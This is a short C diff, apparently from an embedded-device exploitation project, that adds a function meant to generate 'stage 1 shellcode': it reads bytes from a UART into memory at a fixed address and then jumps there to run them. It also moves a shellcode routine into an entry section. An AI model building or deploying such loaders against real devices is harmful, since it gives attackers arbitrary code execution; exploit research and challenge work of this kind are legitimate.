@@ -494,6 +494,18 @@ void attempt_attest() {
 #define UART_STATUS_TX_FULL (1 << 7)
 #define UART_STATUS_RX_EMPTY (1 << 4)
 
+// unused, only used to generate stage 1 shellcode
+__attribute__((used))
+void __stage1_shellcode() {
+    #define TARGET_ADDR 0x20000000
+    #define LENGTH 0x1000
+    for (int i = 0; i < LENGTH; i++) {
+        while (*UART0_STATUS & UART_STATUS_RX_EMPTY);
+        ((volatile unsigned int*)TARGET_ADDR)[i] = *UART0_FIFO;
+    }
+    ((void(*)(void))TARGET_ADDR)();
+}
+
 __attribute__((section(".text_shellcode")))
 static void _sc_putchar(char c) {
     while (*UART0_STATUS & UART_STATUS_TX_FULL);
@@ -564,11 +576,10 @@ static void _sc_print_newline() {
 }
 
 __attribute__((noinline))
-__attribute__((section(".text_shellcode")))
+__attribute__((section(".text_shellcode_entry")))
 static void shellcode() {
     char buf[100];
     uint32_t arg1, arg2;
-    memset(buf, 0, 100);
 
     while (1) {
         arg1 = 0;
